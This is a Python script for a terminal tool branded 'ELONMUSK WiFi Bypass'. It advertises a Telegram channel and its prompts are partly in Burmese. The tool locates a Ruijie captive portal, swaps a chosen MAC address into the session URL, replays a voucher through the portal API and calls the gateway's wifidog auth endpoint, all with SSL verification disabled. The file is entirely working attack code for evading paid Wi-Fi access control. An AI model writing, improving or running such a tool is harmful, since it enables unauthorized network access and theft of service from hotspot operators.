import os
import re
import socket
import json
import base64
import time
import sys
from typing import Optional, Dict, Any
import requests
import urllib3

# Suppress insecure request warnings safely
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """Utility class for terminal text color formatting."""
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    RED = "\033[1;31m"
    WHITE = "\033[1;00m"
    CYAN = "\033[1;36m"
    MAGENTA = "\033[1;35m"
    RESET = "\033[0m"


class WiFiBypassTool:
    CONFIG_FILE = "config_johnko.json"
    AUTH_ENDPOINT = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    USER_AGENT = (
        "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
    )

    def __init__(self) -> None:
        self.config: Dict[str, str] = self.load_config()
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.USER_AGENT})
        self.session.verify = False  # Explicitly bypass SSL validation per legacy behavior

    @staticmethod
    def clear_screen() -> None:
        """Clears the terminal screen across multiple platforms."""
        os.system('clear' if os.name == 'posix' else 'cls')

    @staticmethod
    def animate_text(text: str, delay: float = 0.02) -> None:
        """Prints text to the console with a smooth typewriter animation effect."""
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()

    @staticmethod
    def animate_loading_bar(duration: float = 1.5, description: str = "Processing") -> None:
        """Displays an interactive text-based scanning sequence across a precise duration."""
        frames = ["[ ■ □ □ □ ]", "[ ■ ■ □ □ ]", "[ ■ ■ ■ □ ]", "[ ■ ■ ■ ■ ]"]
        steps = len(frames)
        interval = duration / steps
        
        sys.stdout.write(f"{Colors.MAGENTA}{description} ")
        for frame in frames:
            sys.stdout.write(f"\r{Colors.MAGENTA}{description} {Colors.CYAN}{frame}")
            sys.stdout.flush()
            time.sleep(interval)
        sys.stdout.write(f"\r{Colors.MAGENTA}{description} {Colors.GREEN}[ Complete ]\n{Colors.WHITE}")
        sys.stdout.flush()

    def print_banner(self) -> None:
        """Renders the main system title card."""
        c, r, y, g, m, w = Colors.CYAN, Colors.RED, Colors.YELLOW, Colors.GREEN, Colors.MAGENTA, Colors.WHITE
        print(f"{c}╔" + "═" * 75 + f"╗")
        print(f"{c}║{r}  ███████╗██╗      ██████╗ ███╗   ██╗███╗   ███╗██╗   ██╗███████╗██╗  ██╗  {c}║")
        print(f"{c}║{r}  ██╔════╝██║     ██╔═══██╗████╗  ██║████╗ ████║██║   ██║██╔════╝██║ ██╔╝  {c}║")
        print(f"{c}║{y}  █████╗  ██║     ██║   ██║██╔██╗ ██║██╔████╔██║██║   ██║███████╗█████╔╝   {c}║")
        print(f"{c}║{y}  ██╔══╝  ██║     ██║   ██║██║╚██╗██║██║╚██╔╝██║██║   ██║╚════██║██╔═██╗   {c}║")
        print(f"{c}║{g}  ███████╗███████╗╚██████╔╝██║ ╚████║██║ ╚═╝ ██║╚██████╔╝███████║██║  ██╗  {c}║")
        print(f"{g}  ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝  {g}║")
        print(f"{c}╠" + "═" * 75 + f"╣")
        print(f"{c}║{m}                         ✦ ELONMUSK WiFi Bypass ✦                          {c}║")
        print(f"{c}║{g}                       Developer : JOHN KO | @JohnKo                       {c}║")
        print(f"{c}║{c}                 Telegram : https://t.me/starlinkfreezone                  {c}║")
        print(f"{c}╚" + "═" * 75 + f"╝{w}")

    def load_config(self) -> Dict[str, str]:
        """Loads configuration dictionary safely from local file storage."""
        if os.path.exists(self.CONFIG_FILE):
            try:
                with open(self.CONFIG_FILE, "r", encoding="utf-8") as f:
                    return json.load(f)
            except (json.JSONDecodeError, IOError):
                return {}
        return {}

    def save_config(self, session_url: str, mac_address: str, voucher: str, gateway_ip: str) -> None:
        """Saves current state parameters back to storage."""
        self.config = {
            "session_url": session_url,
            "mac_address": mac_address,
            "voucher": voucher,
            "gateway_ip": gateway_ip
        }
        try:
            with open(self.CONFIG_FILE, "w", encoding="utf-8") as f:
                json.dump(self.config, f, indent=4)
        except IOError as e:
            print(f"{Colors.RED}[-] Failed to write configuration file: {e}{Colors.WHITE}")

    def _get_local_gateway(self) -> str:
        """Determines the default gateway dynamically via socket routing check."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
            parts = ip.split('.')
            parts[-1] = '1'
            return '.'.join(parts)
        except Exception:
            return "192.168.110.1"

    def auto_catch_portal(self) -> None:
        """Probes local gateways to extract routing metadata."""
        self.clear_screen()
        print(f"{Colors.GREEN}======================================{Colors.WHITE}")
        print(f"{Colors.CYAN}        Mac url show one click        {Colors.WHITE}")
        print(f"{Colors.GREEN}======================================{Colors.WHITE}\n")

        self.animate_text(f"{Colors.YELLOW}[*] ကျေးဇူးပြု၍ Ruijie Wi-Fi နှင့် ချိတ်ဆက်ထားပါ။{Colors.WHITE}")
        self.animate_text(f"{Colors.YELLOW}[*] အင်တာနက် မပွင့်သေးကြောင်း သေချာပါစေ။{Colors.WHITE}\n")
        
        gateways = [self._get_local_gateway(), "192.168.110.1", "192.168.0.1", "10.44.77.254"]
        gateways = list(dict.fromkeys(gateways)) 
        
        portal_url: Optional[str] = None

        for gw in gateways:
            target = f"http://{gw}"
            print(f"{Colors.CYAN}[*] Intercepting Router Gateway: {target}...{Colors.WHITE}")
            try:
                res = self.session.get(target, timeout=5, allow_redirects=True)
                if "portal-as.ruijienetworks.com" in res.url:
                    portal_url = res.url
                    break
                
                match = re.search(r"href=['\"](.*?)['\"]", res.text)
                if match and "portal-as.ruijienetworks.com" in match.group(1):
                    extracted = match.group(1)
                    portal_url = extracted if extracted.startswith("http") else "https://portal-as.ruijienetworks.com" + extracted
                    break
            except requests.exceptions.RequestException:
                print(f"{Colors.RED}[-] No response from {gw}{Colors.WHITE}")

        if not portal_url:
            print(f"{Colors.CYAN}[*] Trying global HTTP Intercept...{Colors.WHITE}")
            try:
                res = self.session.get("http://httpbin.org/get", timeout=5)
                if "portal-as.ruijienetworks.com" in res.url:
                    portal_url = res.url
                else:
                    match = re.search(r"href=['\"](.*?)['\"]", res.text)
                    if match and "portal-as.ruijienetworks.com" in match.group(1):
                        portal_url = match.group(1)
            except requests.exceptions.RequestException:
                pass

        if portal_url:
            api_url = portal_url.replace("/auth/wifidogAuth/login/?", "/api/auth/wifidog?stage=portal&")
            api_url = api_url.replace("/auth/wifidogAuth/login?", "/api/auth/wifidog?stage=portal&")
            
            print(f"\n{Colors.GREEN}[✓] PORTAL URL အောင်မြင်စွာ ဖမ်းယူရရှိပါပြီ!{Colors.WHITE}")
            print(f"{Colors.GREEN}[✓] API လမ်းကြောင်းသို့ အလိုအလျောက် ပြောင်းလဲပြီးပါပြီ!{Colors.WHITE}")
            print(f"{Colors.YELLOW}-" * 50 + f"{Colors.WHITE}")
            print(f"{Colors.WHITE}{api_url}")
            print(f"{Colors.YELLOW}-" * 50 + f"{Colors.WHITE}")
            
            self.config["session_url"] = api_url
            self.save_config(api_url, self.config.get("mac_address", ""), self.config.get("voucher", ""), self.config.get("gateway_ip", ""))
            print(f"{Colors.GREEN}[✓] URL ကို Config ထဲတွင် အလိုအလျောက် မှတ်သားပြီးပါပြီ।{Colors.WHITE}")
            
            b64_url = base64.b64encode(api_url.encode()).decode()
            print(f"\n{Colors.CYAN}[*] Script ထဲထည့်ရန် API Base64 Code:{Colors.WHITE}")
            print(f"{Colors.GREEN}{b64_url}{Colors.WHITE}\n")
        else:
            print(f"\n{Colors.RED}[❌] Portal URL ကို ဖမ်းမမိပါ။ အင်တာနက် ပွင့်နေသလား ပြန်စစ်ပါ။{Colors.WHITE}")
            
        input(f"\n{Colors.YELLOW}Press Enter to go back to menu...{Colors.WHITE}")

    def _replace_mac(self, url: str, new_mac: str) -> str:
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

    def get_session_id(self, session_url: str, mac_address: str) -> Optional[str]:
        final_url = self._replace_mac(session_url, mac_address)
        headers = {'Referer': final_url}
        try:
            response = self.session.get(final_url, headers=headers, timeout=10)
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response.url)
            return match.group(1) if match else None
        except requests.RequestException as e:
            print(f"{Colors.RED}[-] Error Getting Session ID: {e}{Colors.WHITE}")
            return None

    def login_voucher(self, session_id: str, voucher: str) -> Optional[str]:
        payload = {
            "accessCode": voucher,
            "sessionId": session_id,
            "apiVersion": 1
        }
        headers = {
            "Content-Type": "application/json",
            "Origin": "https://portal-as.ruijienetworks.com",
            "Referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
        }
        try:
            response = self.session.post(self.AUTH_ENDPOINT, json=payload, headers=headers, timeout=10)
            match = re.search(r'token=(.*?)&', response.text)
            return match.group(1) if match else None
        except requests.RequestException as e:
            print(f"{Colors.RED}[-] Voucher Login Error: {e}{Colors.WHITE}")
            return None

    def execute_bypass(self) -> None:
        self.clear_screen()
        self.print_banner()
        
        old_url = self.config.get("session_url", "")
        old_mac = self.config.get("mac_address", "")
        old_voucher = self.config.get("voucher", "")
        old_ip = self.config.get("gateway_ip", "")
        
        print(f"{Colors.YELLOW}[!] အချက်အလက်များ ထည့်သွင်းပါ (မပြင်လိုလျှင် Enter သာနှိပ်ပါ){Colors.WHITE}\n")
        
        print(f"{Colors.CYAN}[*] Current URL :{Colors.WHITE} {old_url[:50]}..." if old_url else f"{Colors.RED}[*] No Saved URL{Colors.WHITE}")
        session_url = input(f"{Colors.GREEN} ➢ WiFi Session URL ထည့်ပါ : {Colors.WHITE}").strip() or old_url
        
        if not session_url:
            print(f"{Colors.RED}[-] URL မရှိဘဲ ဆက်လုပ်၍ မရပါ။ Option 4 ကိုအရင်နှိပ်ပြီး URL ဖမ်းယူပါ။{Colors.WHITE}")
            input("\nGo back to menu...")
            return

        print(f"{Colors.CYAN}[*] Current MAC :{Colors.WHITE} {old_mac}" if old_mac else f"{Colors.RED}[*] No Saved MAC{Colors.WHITE}")
        mac_address = input(f"{Colors.GREEN} ➢ မိမိ MAC Address ထည့်ပါ : {Colors.WHITE}").strip() or old_mac

        print(f"{Colors.CYAN}[*] Current Voucher :{Colors.WHITE} {old_voucher}" if old_voucher else f"{Colors.RED}[*] No Saved Voucher{Colors.WHITE}")
        voucher = input(f"{Colors.GREEN} ➢ Voucher Code ထည့်ပါ     : {Colors.WHITE}").strip() or old_voucher

        print(f"{Colors.CYAN}[*] Current Gateway :{Colors.WHITE} {old_ip}" if old_ip else f"{Colors.RED}[*] No Saved Gateway{Colors.WHITE}")
        gateway_ip = input(f"{Colors.GREEN} ➢ Gateway IP (192.168.x.x): {Colors.WHITE}").strip() or old_ip

        self.save_config(session_url, mac_address, voucher, gateway_ip)
        
        print()
        self.animate_loading_bar(duration=1.2, description="[⏳] Initializing Pipeline")
        
        session_id = self.get_session_id(session_url, mac_address)
        if not session_id:
            input(f"\n{Colors.RED}[-] Bypass Failed to get Session ID. Press Enter...{Colors.WHITE}")
            return
        print(f"{Colors.CYAN}[+] Inactive Session Id :{Colors.WHITE} {session_id}")
            
        active_session_id = self.login_voucher(session_id, voucher)
        if not active_session_id:
            input(f"\n{Colors.RED}[-] Bypass Failed to active voucher. Press Enter...{Colors.WHITE}")
            return
        print(f"{Colors.CYAN}[+] Active Session Id   :{Colors.WHITE} {active_session_id}")

        params = {
            'token': active_session_id,
            'phoneNumber': 'JohnKoUser',
        }
        
        try:
            final_req_url = f'http://{gateway_ip}:2060/wifidog/auth?'
            response = self.session.get(final_req_url, params=params, timeout=10)
            
            success_conditions = ["baidu.com", "success.html", "success"]
            if any(cond in response.url.lower() or cond in response.text.lower() for cond in success_conditions):
                self.animate_text(f"\n{Colors.GREEN}[ ✔ ] Internet Bypass Successful! Enjoy your connection.{Colors.WHITE}", delay=0.01)
            else:
                print(f"\n{Colors.RED}[ ✘ ] Internet Bypass Failed or Unknown Response Route.{Colors.WHITE}")
        except requests.RequestException as e:
            print(f"\n{Colors.RED}[ ✘ ] Auth Gateway connection error: {e}{Colors.WHITE}")
            
        input(f"\n{Colors.YELLOW}Press Enter to go back to menu...{Colors.WHITE}")

    def run(self) -> None:
        while True:
            self.clear_screen()
            self.print_banner()
            print(f"{Colors.CYAN}     ╔═════════════════════════════════════════════════╗{Colors.WHITE}")
            print(f"{Colors.CYAN}     ║ {Colors.YELLOW}[1]{Colors.WHITE} Start WiFi Bypass                           {Colors.CYAN}║{Colors.WHITE}")
            print(f"{Colors.CYAN}     ║ {Colors.YELLOW}[2]{Colors.WHITE} Reset Saved Data (Clear Cache)              {Colors.CYAN}║{Colors.WHITE}")
            print(f"{Colors.CYAN}     ║ {Colors.YELLOW}[3]{Colors.WHITE} {Colors.RED}Exit Tool                                   {Colors.CYAN}║{Colors.WHITE}")
            print(f"{Colors.CYAN}     ║ {Colors.YELLOW}[4]{Colors.WHITE} {Colors.GREEN}Mac url show one click                      {Colors.CYAN}║{Colors.WHITE}")
            print(f"{Colors.CYAN}     ╚═════════════════════════════════════════════════╝{Colors.WHITE}")
            
            choice = input(f"\n{Colors.GREEN} ➢ ရွေးချယ်မှုအမှတ်စဉ် ထည့်ပါ : {Colors.WHITE}").strip()
            
            if choice == "1":
                self.execute_bypass()
            elif choice == "2":
                if os.path.exists(self.CONFIG_FILE):
                    try:
                        os.remove(self.CONFIG_FILE)
                        self.config = {}
                        self.animate_loading_bar(duration=0.8, description="[🧹] Purging cached environment files")
                        print(f"\n{Colors.GREEN}[ ✔ ] Saved Data Cleared Successfully!{Colors.WHITE}")
                    except OSError as e:
                        print(f"\n{Colors.RED}[ ✘ ] Error clearing data: {e}{Colors.WHITE}")
                else:
                    print(f"\n{Colors.YELLOW}[ ! ] No data saved yet.{Colors.WHITE}")
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.WHITE}")
            elif choice == "3":
                self.animate_text(f"\n{Colors.CYAN}[ ♥ ] Good Bye! See you again, Master.{Colors.WHITE}\n", delay=0.03)
                break
            elif choice == "4":
                self.auto_catch_portal()
            else:
                print(f"\n{Colors.RED}[ ✘ ] မှားယွင်းနေပါသည်။ နံပါတ် ၁ မှ ၄ အတွင်းသာ ရွေးချယ်ပေးပါ။{Colors.WHITE}")
                input(f"\n{Colors.YELLOW}Press Enter to try again...{Colors.WHITE}")


if __name__ == "__main__":
    try:
        tool = WiFiBypassTool()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Exiting...{Colors.WHITE}")
 